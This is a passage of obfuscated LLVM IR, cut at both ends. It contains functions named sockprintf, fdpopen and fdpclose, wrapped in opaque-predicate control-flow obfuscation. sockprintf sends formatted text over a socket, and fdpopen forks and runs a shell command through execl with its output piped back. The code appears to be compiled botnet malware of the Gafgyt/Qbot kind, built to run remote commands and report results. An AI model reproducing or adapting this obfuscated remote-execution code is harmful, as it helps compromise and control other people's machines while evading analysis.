  %gen16 = add i32 %_15, 48
  %_17 = sub i32 %232, 48
  %gen18 = mul i32 %_17, 48
  %_19 = sub i32 %232, 48
  %gen20 = mul i32 %_19, 48
  %233 = sub nsw i32 %232, 48
  %_21 = sub i32 %233, 10
  %gen22 = mul i32 %_21, 10
  %234 = sub nsw i32 %233, 10
  %235 = load i32, i32* %18, align 4
  %_23 = sub i32 %235, %234
  %gen24 = mul i32 %_23, %234
  %236 = add nsw i32 %235, %234
  store i32 %236, i32* %18, align 4
  br label %originalBB14

originalBB29alteredBB:                            ; preds = %originalBB29, %129
  %237 = load i32, i32* %18, align 4
  %_30 = sub i32 0, %237
  %gen31 = add i32 %_30, 48
  %_32 = sub i32 0, %237
  %gen33 = add i32 %_32, 48
  %_34 = shl i32 %237, 48
  %_35 = sub i32 %237, 48
  %gen36 = mul i32 %_35, 48
  %238 = add nsw i32 %237, 48
  %239 = trunc i32 %238 to i8
  %240 = load i8*, i8** %17, align 8
  %241 = getelementptr inbounds i8, i8* %240, i32 -1
  store i8* %241, i8** %17, align 8
  store i8 %239, i8* %241, align 1
  %242 = load i32, i32* %11, align 4
  %243 = load i32, i32* %21, align 4
  %_37 = sub i32 %243, %242
  %gen38 = mul i32 %_37, %242
  %_39 = shl i32 %243, %242
  %_40 = sub i32 %243, %242
  %gen41 = mul i32 %_40, %242
  %244 = udiv i32 %243, %242
  store i32 %244, i32* %21, align 4
  br label %originalBB29

originalBB45alteredBB:                            ; preds = %originalBB45, %160
  %245 = load i32, i32* %14, align 4
  %_46 = shl i32 %245, 2
  %_47 = shl i32 %245, 2
  %_48 = sub i32 0, %245
  %gen49 = add i32 %_48, 2
  %_50 = sub i32 %245, 2
  %gen51 = mul i32 %_50, 2
  %_52 = sub i32 %245, 2
  %gen53 = mul i32 %_52, 2
  %246 = and i32 %245, 2
  %247 = icmp ne i32 %246, 0
  br label %originalBB45

originalBB57alteredBB:                            ; preds = %originalBB57, %180
  %248 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %248, i32 45)
  %249 = load i32, i32* %20, align 4
  %_58 = shl i32 %249, 1
  %_59 = shl i32 %249, 1
  %_60 = sub i32 0, %249
  %gen61 = add i32 %_60, 1
  %_62 = sub i32 %249, 1
  %gen63 = mul i32 %_62, 1
  %_64 = sub i32 0, %249
  %gen65 = add i32 %_64, 1
  %_66 = shl i32 %249, 1
  %_67 = sub i32 %249, 1
  %gen68 = mul i32 %_67, 1
  %_69 = shl i32 %249, 1
  %250 = add nsw i32 %249, 1
  store i32 %250, i32* %20, align 4
  %251 = load i32, i32* %13, align 4
  %_70 = sub i32 %251, -1
  %gen71 = mul i32 %_70, -1
  %_72 = sub i32 0, %251
  %gen73 = add i32 %_72, -1
  %252 = add nsw i32 %251, -1
  store i32 %252, i32* %13, align 4
  br label %originalBB57
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  %19 = load i32, i32* @x.17
  %20 = load i32, i32* @y.18
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* @x.17
  %28 = load i32, i32* @y.18
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %18
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = load i32, i32* @x.21
  %4 = load i32, i32* @y.22
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca [1 x %struct.__va_list_tag], align 16
  %16 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  store i8* %1, i8** %12, align 8
  %17 = call noalias i8* @malloc(i64 2048) #5
  store i8* %17, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 2048, i32 1, i1 false)
  %19 = load i8*, i8** %13, align 8
  store i8* %19, i8** %14, align 8
  %20 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %21 = bitcast %struct.__va_list_tag* %20 to i8*
  call void @llvm.va_start(i8* %21)
  %22 = load i8*, i8** %12, align 8
  %23 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %24 = call i32 @print(i8** %13, i8* %22, %struct.__va_list_tag* %23)
  %25 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %26 = bitcast %struct.__va_list_tag* %25 to i8*
  call void @llvm.va_end(i8* %26)
  %27 = load i8*, i8** %14, align 8
  %28 = load i8*, i8** %14, align 8
  %29 = call i64 @strlen(i8* %28) #10
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  store i8 10, i8* %30, align 1
  %31 = load i8*, i8** %14, align 8
  %32 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0), i8* %31)
  %33 = load i32, i32* %11, align 4
  %34 = load i8*, i8** %14, align 8
  %35 = load i8*, i8** %14, align 8
  %36 = call i64 @strlen(i8* %35) #10
  %37 = call i64 @send(i32 %33, i8* %34, i64 %36, i32 16384)
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %16, align 4
  %39 = load i8*, i8** %14, align 8
  call void @free(i8* %39) #5
  %40 = load i32, i32* %16, align 4
  %41 = load i32, i32* @x.21
  %42 = load i32, i32* @y.22
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %40

originalBBalteredBB:                              ; preds = %originalBB, %2
  %49 = alloca i32, align 4
  %50 = alloca i8*, align 8
  %51 = alloca i8*, align 8
  %52 = alloca i8*, align 8
  %53 = alloca [1 x %struct.__va_list_tag], align 16
  %54 = alloca i32, align 4
  store i32 %0, i32* %49, align 4
  store i8* %1, i8** %50, align 8
  %55 = call noalias i8* @malloc(i64 2048) #5
  store i8* %55, i8** %51, align 8
  %56 = load i8*, i8** %51, align 8
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 2048, i32 1, i1 false)
  %57 = load i8*, i8** %51, align 8
  store i8* %57, i8** %52, align 8
  %58 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %59 = bitcast %struct.__va_list_tag* %58 to i8*
  call void @llvm.va_start(i8* %59)
  %60 = load i8*, i8** %50, align 8
  %61 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %62 = call i32 @print(i8** %51, i8* %60, %struct.__va_list_tag* %61)
  %63 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %64 = bitcast %struct.__va_list_tag* %63 to i8*
  call void @llvm.va_end(i8* %64)
  %65 = load i8*, i8** %52, align 8
  %66 = load i8*, i8** %52, align 8
  %67 = call i64 @strlen(i8* %66) #10
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  store i8 10, i8* %68, align 1
  %69 = load i8*, i8** %52, align 8
  %70 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0), i8* %69)
  %71 = load i32, i32* %49, align 4
  %72 = load i8*, i8** %52, align 8
  %73 = load i8*, i8** %52, align 8
  %74 = call i64 @strlen(i8* %73) #10
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* %54, align 4
  %77 = load i8*, i8** %52, align 8
  call void @free(i8* %77) #5
  %78 = load i32, i32* %54, align 4
  br label %originalBB
}

declare i64 @send(i32, i8*, i64, i32) #4

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = load i32, i32* @x.23
  %4 = load i32, i32* @y.24
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca [2 x i32], align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 114
  %22 = load i32, i32* @x.23
  %23 = load i32, i32* @y.24
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %21, label %30, label %51

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i32, i32* @x.23
  %32 = load i32, i32* @y.24
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load i8*, i8** %13, align 8
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp ne i32 %41, 119
  %43 = load i32, i32* @x.23
  %44 = load i32, i32* @y.24
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %42, label %57, label %51

; <label>:51:                                     ; preds = %originalBBpart24, %originalBBpart2
  %52 = load i8*, i8** %13, align 8
  %53 = getelementptr inbounds i8, i8* %52, i64 1
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %51, %originalBBpart24
  store i32 -1, i32* %11, align 4
  br label %253

; <label>:58:                                     ; preds = %51
  %59 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i32 0, i32 0
  %60 = call i32 @pipe(i32* %59) #5
  %61 = icmp slt i32 %60, 0
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %58
  store i32 -1, i32* %11, align 4
  br label %253

; <label>:63:                                     ; preds = %58
  %64 = load i32, i32* @x.23
  %65 = load i32, i32* @y.24
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %63
  %72 = load i32*, i32** @fdopen_pids, align 8
  %73 = icmp eq i32* %72, null
  %74 = load i32, i32* @x.23
  %75 = load i32, i32* @y.24
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %73, label %82, label %118

; <label>:82:                                     ; preds = %originalBBpart28
  %83 = call i32 @getdtablesize() #5
  store i32 %83, i32* %16, align 4
  %84 = icmp sle i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %82
  store i32 -1, i32* %11, align 4
  br label %253

; <label>:86:                                     ; preds = %82
  %87 = load i32, i32* %16, align 4
  %88 = sext i32 %87 to i64
  %89 = mul i64 %88, 4
  %90 = trunc i64 %89 to i32
  %91 = zext i32 %90 to i64
  %92 = call noalias i8* @malloc(i64 %91) #5
  %93 = bitcast i8* %92 to i32*
  store i32* %93, i32** @fdopen_pids, align 8
  %94 = icmp eq i32* %93, null
  br i1 %94, label %95, label %112

; <label>:95:                                     ; preds = %86
  %96 = load i32, i32* @x.23
  %97 = load i32, i32* @y.24
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %95
  store i32 -1, i32* %11, align 4
  %104 = load i32, i32* @x.23
  %105 = load i32, i32* @y.24
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %253

; <label>:112:                                    ; preds = %86
  %113 = load i32*, i32** @fdopen_pids, align 8
  %114 = bitcast i32* %113 to i8*
  %115 = load i32, i32* %16, align 4
  %116 = sext i32 %115 to i64
  %117 = mul i64 %116, 4
  call void @llvm.memset.p0i8.i64(i8* %114, i8 0, i64 %117, i32 1, i1 false)
  br label %118

; <label>:118:                                    ; preds = %112, %originalBBpart28
  %119 = call i32 @vfork() #11
  store i32 %119, i32* %17, align 4
  switch i32 %119, label %213 [
    i32 -1, label %120
    i32 0, label %143
  ]

; <label>:120:                                    ; preds = %118
  %121 = load i32, i32* @x.23
  %122 = load i32, i32* @y.24
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %120
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  %132 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %133 = load i32, i32* %132, align 4
  %134 = call i32 @close(i32 %133)
  store i32 -1, i32* %11, align 4
  %135 = load i32, i32* @x.23
  %136 = load i32, i32* @y.24
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %253

; <label>:143:                                    ; preds = %118
  %144 = load i8*, i8** %13, align 8
  %145 = load i8, i8* %144, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 114
  br i1 %147, label %148, label %179

; <label>:148:                                    ; preds = %143
  %149 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %150 = load i32, i32* %149, align 4
  %151 = icmp ne i32 %150, 1
  br i1 %151, label %152, label %159

; <label>:152:                                    ; preds = %148
  %153 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @dup2(i32 %154, i32 1) #5
  %156 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %157 = load i32, i32* %156, align 4
  %158 = call i32 @close(i32 %157)
  br label %159

; <label>:159:                                    ; preds = %152, %148
  %160 = load i32, i32* @x.23
  %161 = load i32, i32* @y.24
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %159
  %168 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %169 = load i32, i32* %168, align 4
  %170 = call i32 @close(i32 %169)
  %171 = load i32, i32* @x.23
  %172 = load i32, i32* @y.24
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %194

; <label>:179:                                    ; preds = %143
  %180 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %181 = load i32, i32* %180, align 4
  %182 = icmp ne i32 %181, 0
  br i1 %182, label %183, label %190

; <label>:183:                                    ; preds = %179
  %184 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %185 = load i32, i32* %184, align 4
  %186 = call i32 @dup2(i32 %185, i32 0) #5
  %187 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %188 = load i32, i32* %187, align 4
  %189 = call i32 @close(i32 %188)
  br label %190

; <label>:190:                                    ; preds = %183, %179
  %191 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %192 = load i32, i32* %191, align 4
  %193 = call i32 @close(i32 %192)
  br label %194

; <label>:194:                                    ; preds = %190, %originalBBpart220
  %195 = load i32, i32* @x.23
  %196 = load i32, i32* @y.24
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %194
  %203 = load i8*, i8** %12, align 8
  %204 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i32 0, i32 0), i8* %203, i8* null) #5
  call void @_exit(i32 127) #12
  %205 = load i32, i32* @x.23
  %206 = load i32, i32* @y.24
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  unreachable

; <label>:213:                                    ; preds = %118
  %214 = load i8*, i8** %13, align 8
  %215 = load i8, i8* %214, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 114
  br i1 %217, label %218, label %240

; <label>:218:                                    ; preds = %213
  %219 = load i32, i32* @x.23
  %220 = load i32, i32* @y.24
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %218
  %227 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %228 = load i32, i32* %227, align 4
  store i32 %228, i32* %14, align 4
  %229 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %230 = load i32, i32* %229, align 4
  %231 = call i32 @close(i32 %230)
  %232 = load i32, i32* @x.23
  %233 = load i32, i32* @y.24
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %246

; <label>:240:                                    ; preds = %213
  %241 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %242 = load i32, i32* %241, align 4
  store i32 %242, i32* %14, align 4
  %243 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %244 = load i32, i32* %243, align 4
  %245 = call i32 @close(i32 %244)
  br label %246

; <label>:246:                                    ; preds = %240, %originalBBpart228
  %247 = load i32, i32* %17, align 4
  %248 = load i32*, i32** @fdopen_pids, align 8
  %249 = load i32, i32* %14, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds i32, i32* %248, i64 %250
  store i32 %247, i32* %251, align 4
  %252 = load i32, i32* %14, align 4
  store i32 %252, i32* %11, align 4
  br label %253

; <label>:253:                                    ; preds = %246, %originalBBpart216, %originalBBpart212, %85, %62, %57
  %254 = load i32, i32* %11, align 4
  ret i32 %254

originalBBalteredBB:                              ; preds = %originalBB, %2
  %255 = alloca i32, align 4
  %256 = alloca i8*, align 8
  %257 = alloca i8*, align 8
  %258 = alloca i32, align 4
  %259 = alloca [2 x i32], align 4
  %260 = alloca i32, align 4
  %261 = alloca i32, align 4
  store i8* %0, i8** %256, align 8
  store i8* %1, i8** %257, align 8
  %262 = load i8*, i8** %257, align 8
  %263 = load i8, i8* %262, align 1
  %264 = zext i8 %263 to i32
  %265 = icmp ne i32 %264, 114
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %266 = load i8*, i8** %13, align 8
  %267 = load i8, i8* %266, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp ne i32 %268, 119
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %63
  %270 = load i32*, i32** @fdopen_pids, align 8
  %271 = icmp eq i32* %270, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %95
  store i32 -1, i32* %11, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %120
  %272 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %273 = load i32, i32* %272, align 4
  %274 = call i32 @close(i32 %273)
  %275 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %276 = load i32, i32* %275, align 4
  %277 = call i32 @close(i32 %276)
  store i32 -1, i32* %11, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %159
  %278 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %279 = load i32, i32* %278, align 4
  %280 = call i32 @close(i32 %279)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %194
  %281 = load i8*, i8** %12, align 8
  %282 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i32 0, i32 0), i8* %281, i8* null) #5
  call void @_exit(i32 127) #12
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %218
  %283 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %284 = load i32, i32* %283, align 4
  store i32 %284, i32* %14, align 4
  %285 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %286 = load i32, i32* %285, align 4
  %287 = call i32 @close(i32 %286)
  br label %originalBB26
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #2

; Function Attrs: nounwind
declare i32 @getdtablesize() #2

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #2

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #2

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %94

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #5
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #5
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #5
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #5
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #5
  br label %28

; <label>:28:                                     ; preds = %originalBBpart24, %20
  %29 = load i32, i32* @x.25
  %30 = load i32, i32* @y.26
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %28
  %37 = load i32*, i32** @fdopen_pids, align 8
  %38 = load i32, i32* %3, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i32, i32* %37, i64 %39
  %41 = load i32, i32* %40, align 4
  %42 = call i32 @waitpid(i32 %41, i32* %7, i32 0)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* @x.25
  %44 = load i32, i32* @y.26
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %51

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = load i32, i32* %8, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %51
  %55 = call i32* @__errno_location() #13
  %56 = load i32, i32* %55, align 4
  %57 = icmp eq i32 %56, 4
  br label %58

; <label>:58:                                     ; preds = %54, %51
